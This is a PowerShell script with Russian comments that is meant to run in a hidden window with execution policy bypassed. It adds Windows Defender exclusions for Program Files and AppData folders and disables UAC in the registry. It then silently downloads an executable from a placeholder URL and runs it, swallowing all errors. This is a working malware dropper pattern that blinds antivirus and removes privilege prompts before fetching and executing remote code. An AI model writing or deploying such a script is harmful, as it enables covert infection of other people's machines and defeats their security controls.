# ============================================================
#  run.ps1
#  Запуск: powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\temp\run.ps1"
#  Требует прав администратора (HKLM + Add-MpPreference).
# ============================================================

# --- Настройки -------------------------------------------------
$Url       = "URL_ПРОГРАММЫ"      # <-- замените на прямую ссылку
$OutFile   = Join-Path $env:TEMP "setup.exe"
$SilentArg = "/S"                 # /S, /silent, /quiet, /verysilent — зависит от инсталлятора
# ---------------------------------------------------------------

# --- 1. Исключения Windows Defender ---------------------------
try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {

        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath         = $ProgramFilesX86 -replace " \(x86\)", ""
        Add-MpPreference -ExclusionPath $updpath -ErrorAction SilentlyContinue

        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86 -ErrorAction SilentlyContinue
        }

        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData -ErrorAction SilentlyContinue

        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData -ErrorAction SilentlyContinue
    }
}
catch {}

# --- 2. Отключение UAC (вступит в силу после перезагрузки) ----
try {
    $uacPath     = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    $uacProperty = "EnableLUA"
    Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0 -ErrorAction SilentlyContinue
}
catch {}

# --- 3. Тихая загрузка и запуск -------------------------------
try {
    Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
    Start-Process -FilePath $OutFile -ArgumentList $SilentArg -Wait
}
catch {}
